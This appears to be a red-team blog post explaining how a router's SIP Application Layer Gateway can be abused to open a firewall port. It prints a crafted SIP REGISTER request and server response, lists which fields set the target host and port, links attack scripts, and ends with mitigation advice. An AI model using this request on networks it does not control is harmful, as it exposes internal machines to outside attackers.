---
title: "Abusing Application Layer Gateways (NAT Slipstreaming)"
date: 2020-11-23T23:00:57-08:00
draft: true
tags: [
        "red",
        "ttp",
        "research"
    ]
---

You might have heard about ["NAT Slipstreaming"](https://samy.pl/slipstream/) by Samy Kamkar. It's an amazing technique that allows punching a hole in your routers firewall by just visiting a website.

The attack depends on the router having the `Application Layer Gateway` enabled. This gateway can be used by anyone inside your network to open a firewall port (totally by design). Protocols such as `SIP` (Session Initiation Protocol) use it.

What I will focus on in this post is the `Application Layer Gateway Protocol` (`ALG`) and `SIP`. In particular to understand how these can be abused by an adversary. 

I won't be discussing the browser-based attack angle in this post.

Let's get started.

## Application Layer Gateway and SIP

The `ALG` monitors traffic passing through your router. It will act on and modify requests for some protocols if enabled. One of the protocols that can be enabled is `SIP`. 

`SIP` is a text-based protocol, just like HTTP. It is used in Voice over IP (VoIP) applications. VoIP works better peer-to-peer, so there is a `REGISTER` verb that allows punching a hole into your firewall. 

More details of the `SIP` protocol are described in [RFC 3327](https://tools.ietf.org/html/rfc3327). 

To learn more about this I implemented a simple fake SIP server and a client for Linux/macOS and also a client for PowerShell for Windows.

### Implementing a fake SIP Server 

The fake SIP server is just a basic TCP server written in Python. I took the core messages that are sent back and forth from Samy's implementation.

The code for the server, called it natty-slipstream, is [here](https://github.com/wunderwuzzi23/natty-slipstream/blob/main/sip-server.py).

### SIP REGISTER Request

After the fake `SIP` server is up and running outside your network, you can try to punch a hole in your firewall. This is done by sending the `REGISTER` request to the server.

I created two implementations for this:

1. [Windows PowerShell](https://github.com/wunderwuzzi23/natty-slipstream/blob/main/Invoke-NATOpenPort.ps1)
2. [Linux/macOS - Bash/curl](https://github.com/wunderwuzzi23/natty-slipstream/blob/main/natty.sh.txt)

For the `Bash` based Linux/macOS version `curl` is used. Interestingly my router did not mind some incorrect headers and strings in the `SIP` requests.

*If you are on macOS you might have to modify the way to get local IP, if you don't have `ip` available. Or just manually update the script and insert the IP on your local network*

This is how the request looks like:

```
REGISTER sip:example.org;transport=TCP SIP/2.0
Via: SIP/2.0/TCP 192.168.1.141:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
Max-Forwards: 70
Contact: <sip:wuzzi@192.168.1.141:1433;rinstance=v40f3f83b335139c;transport=TCP>
To: <sip:wuzzi@example.org;transport=TCP>
From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519
Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.
CSeq: 1 REGISTER
Expires: 70
Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
Allow-Events: presence, kpml
Content-Length: 0

```

The parts of the request that require customization are:

* `192.168.1.141` The IP address of the internal target machine 
* `Port 5060` The remote port of the fake SIP Server 
* `Port 1433` The port that we want to expose externally to the fake SIP server

### Address Translation

If your router has `ALG` for `SIP` enabled, it will replace the internal IP address in the packet (in this case `192.168.1.141`) with the routers public IP address. 

### SIP Response

After receiving the client's request, the server responds with the following message:

```
SIP/2.0 200 OK
Via: SIP/2.0/TCP 174.nn.nn.nnn:59973;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP;received=10.10.10.10
From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519
To: <sip:wuzzi@example.org;transport=TCP>;tag=37GkEhwl6
Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.
CSeq: 1 REGISTER
Contact: <sip:wunder@174.nnn.nnn.nnn:44444;rinstance=v40f3f83b335139c;transport=TCP>;expires=3600
Content-Length: 0

```

Notice the IP address (`174.nn.nn.nnn`) which is the public IP of the router.

When the response is processed by the router, it will replace the public IP with the internal IP again. 

And it will open up the requested port `1433` for the server to connect. Nice.

### The hole is punched

That is it, now I was able to connect to the port from the outside!

The port stayed open for about 2 minutes. I tried changing the expiration header, but it did not change the duration of the exposure for my router model. But two minutes is plenty of time to connect.

## Mitigation

Check your router configuration to ensure attack surface is limited. Disabling `SIP` and `ALG` on the router will mitigate this. In my case there was no need for `ALG`, so this was a simple fix. 

This is a design flaw of the protocol, and it is not unlikely that more attacks in this realm will show up as more people start looking at this.


## Conclusion

That's it. Hope this was interesting and useful. For red teaming this is an interesting TTP to expose internal infrastructure with a benign looking request to port `5060`.

If you haven't yet, check out [Cybersecurity Attacks - Red Team Strategies](https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&tag=wunderwuzzi-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1838828869&linkId=07bfd6b729fbc2b2904160e0e16c337f) for lots of red teaming goodies.

Cheers,
Johann.

Twitter: [@wunderwuzzi23](https://twitter.com/wunderwuzzi23)


## References

* [RFC 3327](https://tools.ietf.org/html/rfc3327)
* [NAT Slipstream, Samy Kamkar](https://samy.pl/slipstream/)
